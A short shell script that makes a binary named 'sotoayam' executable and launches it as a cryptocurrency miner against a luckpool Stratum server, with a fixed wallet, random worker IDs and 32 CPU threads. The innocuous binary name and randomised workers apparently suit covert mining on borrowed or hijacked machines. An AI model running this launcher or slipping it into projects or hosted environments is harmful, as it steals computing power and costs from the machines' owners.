chmod 777 sotoayam
PULL=stratum+tcp://na.luckpool.net:3956#xnsub
WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
./sotoayam -c $PULL -u $WUL.$WOR -p x --cpu 32
